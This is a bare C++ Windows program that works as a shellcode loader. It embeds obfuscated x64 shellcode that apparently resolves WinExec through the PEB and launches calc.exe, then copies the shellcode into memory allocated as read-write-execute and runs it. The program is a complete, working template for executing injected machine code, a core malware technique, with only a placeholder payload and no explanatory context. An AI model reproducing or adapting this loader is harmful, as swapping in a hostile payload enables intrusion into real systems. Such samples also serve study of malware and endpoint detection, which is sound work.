#include <windows.h>
#include <iostream>

unsigned char shellcode[] =
"\x48\x83\xec\x28\x48\x83\xe4\xf0\x48\x31\xc9\x65\x48\x8b\x41"
"\x60\x48\x8b\x40\x18\x48\x8b\x70\x10\x48\x8b\x36\x48\x8b\x36"
"\x48\x8b\x5e\x30\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31"
"\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01"
"\xc2\x44\x8b\x52\x14\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3"
"\x4c\x89\xd1\x48\xb8\xa8\x96\x91\xba\x87\x9a\x9c\x6f\x48\xf7"
"\xd0\x48\xc1\xe0\x08\x48\xc1\xe8\x08\x50\x48\x89\xe0\x48\x83"
"\xc4\x08\x67\xe3\x16\x31\xdb\x41\x8b\x1c\x8b\x4c\x01\xc3\x48"
"\xff\xc9\x4c\x8b\x08\x4c\x39\x0b\x74\x03\x75\xe7\xcc\xff\xc1"
"\x4d\x31\xdb\x44\x8b\x5a\x1c\x4d\x01\xc3\x45\x8b\x3c\x8b\x4d"
"\x01\xc7\x48\x31\xc0\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87"
"\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\x31\xd2\x48\xff\xc2\x48"
"\x83\xec\x30\x41\xff\xd7";


int main() {

    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (exec_mem == nullptr) {
        std::cerr << "Memory allocation failed\n";
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    auto shellcode_func = reinterpret_cast<void(*)()>(exec_mem);
    shellcode_func();
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}